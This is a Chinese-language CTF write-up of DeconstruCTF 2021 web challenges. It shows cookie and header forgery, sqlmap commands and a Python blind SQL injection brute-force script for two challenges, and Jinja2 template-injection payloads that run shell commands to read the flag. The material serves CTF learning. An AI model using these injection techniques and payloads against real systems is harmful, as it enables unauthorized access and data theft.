---
title: "DeconstruCTF2021 Wp"
slug: "deconstruCTF2021-wp"
description: "水，就摁水，摁复现"
date: 2021-10-30T13:35:32+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

https://ctftime.org/event/1453/tasks/

## Web/Here's a Flag

> A quick teaser to get yourself ready for the challenges to come! Just look for/at the flag and perhaps try your hand at some frontend tomfoolery?

![image-20211003224148107](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003224148107.png)

![image-20211003224209166](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003224209166.png)

https://www.youtube.com/watch?v=dQw4w9WgXcQ 不用看了 Never Gonna Give You Up

看style.css flag: "gvf{zh0frph_wr_ghfrqvwuxfwi}"; 但是不是最终的flag，解一下rot13 amount=23

`dsc{we0come_to_deconstructf}`

签到题也好折腾TAT

## Web/Please

> Hi there! We used to work together back in our old company DEEMA. I recently had a problem with my computer and lost all the files on it. I remember creating a backup of my files on the company's servers. I know it's been a while, but could you **please** try to access those files? I would be very grateful!

![image-20211003225518532](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003225518532.png)

熟练抓包，Cookie中有两个参数，Admin_Access和Username，改为True和Clancy

![image-20211003230430641](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003230430641.png)

改浏览器标识头 `User-Agent: DeemBrowser`

![image-20211003230638917](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003230638917.png)

需要基础认证，但是这里的MagicWord稍微卡了一下

![image-20211003232421727](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003232421727.png)

原因是我太铸币了忘了加Basic，`Authorization: Basic V2hhdCdzVGhlTWFnaWNXb3JkPw==`

![image-20211004003846943](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004003846943.png)

加一个日期的头，`Date: Thu, 1 Apr 2021 12:00:00 GMT`

![image-20211004004026742](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004004026742.png)

换成`Date: Mon, 5 Apr 2021 12:00:00 GMT`

![image-20211004004153788](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004004153788.png)

`dsc{4ll-y0u-g0tt4-d0-15-r3qu35t-n1c3ly}`

## Web/Taxi Union Problems

> An important package has been stolen from Mr Nagaraj by a Taxi driver. We've tried to ask the local taxi union about driver's location but they are refusing provide the same.
>
> Since this package is required for a time sensitive matter we don't have time to negotiate with the union.
>
> Your task is to obtain the location of the taxi using the given information
> `Taxi Lisence Plate: TN-06-AP-9879`
>
> HINT: The flag is the location of the taxi (no caps)

![image-20211003233419781](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003233419781.png)

输入`TN-06-AP-9879'--%20`回显一样，有注入，把post的内容拿去让sqlmap跑一下

```
python sqlmap.py -r "/home/amelia/sh4r3/post.txt" -p lisence_plate --tables
python sqlmap.py -r "/home/amelia/sh4r3/post.txt" -p lisence_plate -T taxi --columns
python sqlmap.py -r "/home/amelia/sh4r3/post.txt" -p lisence_plate -T taxi --dump
```

![image-20211004000253417](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000253417.png)

Ayanavaram

## *Web/Never gonna lie to you

> Trust me, take everything in the home page for face value. I would never lie to you.

主页有一句*Not even search engines can find it.*，提示我们看/robots.txt

![image-20211004000643314](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000643314.png)

转到/never_gonna_give_you_up页面，标题是Admin Page但是一片空白，抓包后看到post表单的地方被抬头给挡住了，目标地址是/never_gonna_let_you_down

![image-20211004000944013](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000944013.png)

提交两个参数username和password，回显*YOU LIED TO ME !!!*

————然后没然后了 我还没看完 环境就关了TAT

## Web/Curly Fries 1

> Normal fries are nice, but everything's better with a curl in it. The flag is right in front of you.

![image-20211004170846442](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004170846442.png)

emmmmm 没有任何提示

看wp以后发现这是真脑洞了，但也不能这么说，毕竟已经给出了Sweden很明显的提示，我们需要用指定的Swedish语言来访问这个网站

```bash
curl -i http://very.uniquename.xyz:8880/ -H "Accept-Language: sv-SE"
```

![image-20211004171513900](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004171513900.png)

`dsc{1_l0v3_sw3d3n}`

## Web/The Gate Keeper

> That what you want is with the Gate keeper, but you need to cheat the Gate keeper to get it.
>
> **Note:** This challenge might require a bruteforce approach.

![image-20211004171755317](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004171755317.png)

还是sqli

```python
import requests
import string

flag = ''

print(flag)

domain = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_}'

f = 0

challenge = "gate keeper"
url = ""
check = ""
key = ""
column = ""
if challenge == "taxi union":
    url = 'http://extremely.uniquename.xyz:2052/'
    check = "TN-06-AP-9879"
    key = 'lisence_plate'
    column = "location"
elif challenge == 'gate keeper':
    url = 'http://extremely.uniquename.xyz:2082/'
    check = "The flag for the CTF is the password you entered.(If you havent cheated that is)"
    key = 'password'
    column = "password"

print("URL", url)

while True:
    for char in domain:
        payload = "' or {} like '{}%'; --".format(column, flag + char)
        print(payload)

        r = requests.post(url, data={key: payload})

        if (check in r.text):
            flag = flag + char
            print("Success " + flag)

            break

```



## Web/Hungry Man

> There is nothing here I promise! ;)

![image-20211004172041299](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172041299.png)

抓包，cookie部分有一个b64，解码后

![image-20211004172123925](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172123925.png)

说实话，这个题做的时候没注意set-cookie的部分，[参考wp](https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Hungry%20Man)

这里的依据set-cookie的值设置后，会不断的产生新的md5-hash的cookie值，写一个脚本不断地设置和应用新的cookie，将这些解密后拼起来就是flag了

`dsc{91v3_m3_4_h4ndfu1_0f_c00k135}`

## Web/Curly Fries 2

> Normal fries are nice, but everything's better with a curl in it. Why do logos make things so recognizable?

![image-20211004172502484](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172502484.png)

无提示，[参考wp](https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Curly%20Fries%202)

有点脑洞了，把User-Agent的地方设置为xbox和Linux之后，图片会消失并露出flag

`dsc{1m4g1n3_l1nux_0n_4n_xb0x}`

## Web/Curly Fries 3

> Normal fries are nice, but everything's better with a curl in it. I'm with you, every step of the way.

直接访问提示405，post一下回显*perhaps try Googling me instead?*

访问/robots.txt，404

用wappalyzer可以看到这是一个flask应用

[参考wp](https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Curly%20Fries%203)

看到第一个提示之后不够敏感，我们可以设置来源refer是google.com

```
curl -i -X POST -H "Referer: https://www.google.com" http://overly.uniquename.xyz:2095/
```

回显中提示我们再设置Host

```
curl -i -X POST -H "Referer: https://www.google.com" -H"Host:https://dscvit.com" http://overly.uniquename.xyz:2095/
```

回显*potates and carrots are my friends, milk and Cookies will be my end*，不是很明显，但是应该设置cookie=root

之后回显*JFATHER, JMOTHER, JDAUGHTER, ____?*，提示把content-type改为json

回显*{'error': 'json data missing'}*，添加一点data

```
curl -i -X POST -H "Referer: https://www.google.com" -H "Host: https://www.dscvit.com" -H "Content-Type: application/json" --cookie "user=root" -d '{"foo":"bar"}' http://overly.uniquename.xyz:2095/
```

回显*{'error': {'messi': 'required'}}*，将foo改为bar，回显*{'error': {'messi': 'which club am i at?'}}*

*不太懂为啥这就能知道把bar赋值为PSG？？？

```
curl -i -X POST -H "Referer: https://www.google.com" -H "Host: https://www.dscvit.com" -H "Content-Type: application/json" --cookie "user=root" -d '{"messi":"psg"}' http://overly.uniquename.xyz:2095/
```

得到flag `dsc{th15_15_w4y_t00_much_w0rk}`



## Web/Mega Mailer

> We recently launched a mass email sender that can work with any SMTP server, but recently we have reports of information leaks and and trolling through our service. Can you find whats wrong with it ?

![image-20211004005500420](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004005500420.png)

讲真，之前没接触过

首先在自己的vps上开一个smtp的服务，用python开

```bash
python3 -m smtpd -c DebuggingServer -n 0.0.0.0:25
```

然后其它信息正常填，body部分存在ssti注入，payload来自于[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

```
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -a').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}}
```

![image-20211004181339121](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004181339121.png)

`dsc{819_8r41n_m41L3R}`

参考：[wp](https://github.com/ComdeyOverFlow/DeconstruCTF-2021/blob/main/Mega-Mailer/README.md)

------

说实话，这一篇wp早就水完了，但是中间那个Never gonna lie to you的题因为没有地方复现也没搜着别的wp就一直拖着，拖到现在，还是没找到，放弃了，可惜死了，这个故事告诉我们做题复现要趁早